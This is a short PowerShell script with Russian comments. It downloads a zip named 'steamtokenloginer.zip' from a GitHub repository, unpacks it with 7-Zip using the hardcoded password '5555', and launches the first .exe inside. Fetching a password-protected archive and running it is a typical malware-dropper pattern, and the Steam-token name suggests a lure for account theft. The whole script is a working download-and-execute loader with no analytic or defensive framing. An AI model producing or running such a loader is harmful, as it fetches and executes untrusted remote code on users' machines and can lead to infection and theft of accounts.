$zipUrl="https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.zip"
$targetFolder="C:\Users\zenas\Desktop\Новая папка (7)"
$zipPath="$targetFolder\steamtokenloginer.zip"

if(-not(Test-Path $targetFolder)){New-Item -ItemType Directory -Path $targetFolder -Force}

try{
    # Скачиваем и проверяем размер
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
    $zipSize=(Get-Item $zipPath).Length/1MB
    Write-Host "ZIP size: $([math]::Round($zipSize,2)) MB"
    
    if($zipSize -gt 0){
        # Пробуем распаковать
        $7zipPath="$env:ProgramFiles\7-Zip\7z.exe"
        if(Test-Path $7zipPath){
            & $7zipPath x "-p5555" "-o$targetFolder" "-y" $zipPath
        }
        
        # Проверяем распакованные файлы
        $extractedFiles=Get-ChildItem $targetFolder -Recurse | Where-Object{$_.Name -ne "steamtokenloginer.zip"}
        foreach($file in $extractedFiles){
            Write-Host "File: $($file.Name) - $([math]::Round($file.Length/1KB,2)) KB"
        }
        
        # Запускаем EXE если найден
        $exeFile=$extractedFiles | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
        if($exeFile -and $exeFile.Length -gt 0){
            Start-Process -FilePath $exeFile.FullName
        }else{
            Write-Host "EXE file not found or corrupted"
            Invoke-Item $targetFolder
        }
    }
}catch{$_}
